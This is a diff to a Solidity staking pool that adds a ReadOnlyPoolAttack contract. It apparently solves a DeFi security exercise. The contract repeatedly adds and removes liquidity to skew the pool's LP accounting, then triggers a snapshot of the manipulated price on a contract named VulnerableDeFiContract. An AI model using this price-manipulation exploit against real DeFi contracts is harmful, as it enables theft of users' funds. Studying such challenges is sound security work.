@@ -1,10 +1,13 @@
 //SPDX-License-Identifier: GPL-3.0
 pragma solidity ^0.8.7;
+
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import "@openzeppelin/contracts/token/ERC777/ERC777.sol";
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+
+import "hardhat/console.sol";
 
 // Users can stake ether in ReadOnlyPool
 // For each ether they contribute to the pool, they are minted an equal amount of
@@ -66,7 +69,7 @@ contract ReadOnlyPool is ReentrancyGuard, ERC20("LPToken", "LPT") {
         uint256 ethToReturn = (originalStake[msg.sender] * (numLPTokens + totalLPTokens)) / totalLPTokens;
 
         originalStake[msg.sender] = 0;
-        (bool ok, ) = msg.sender.call{value: ethToReturn}("");
+        (bool ok,) = msg.sender.call{value: ethToReturn}("");
         require(ok, "eth transfer failed");
 
         _burn(msg.sender, numLPTokens);
@@ -85,4 +88,32 @@ contract ReadOnlyPool is ReentrancyGuard, ERC20("LPToken", "LPT") {
 
     // @notice earn profits for the pool
     function earnProfit() external payable {}
+}
+
+contract ReadOnlyPoolAttack {
+    constructor() {}
+
+    function attack(address victim, address pool) public payable {
+        for (uint256 i = 0; i <= 100; i++) {
+            console.log(address(this).balance);
+            console.log("AAA");
+            ReadOnlyPool(pool).addLiquidity{value: address(this).balance}();
+            ReadOnlyPool(pool).removeLiquidity();
+            uint256 s = ReadOnlyPool(pool).totalSupply();
+            if ((address(this).balance * (address(this).balance * 2 + s) / (s + address(this).balance)) > (103 ether)) {
+                console.log(address(this).balance);
+                console.log(address(pool).balance);
+                console.log(s);
+                break;
+            }
+            //37102607170690900000
+        }
+        ReadOnlyPool(pool).addLiquidity{value: 23125182331413630141}();
+        ReadOnlyPool(pool).removeLiquidity();
+        console.log(address(this).balance);
+        console.log(address(pool).balance);
+        VulnerableDeFiContract(victim).snapshotPrice();
+    }
+
+    receive() external payable {}
 }
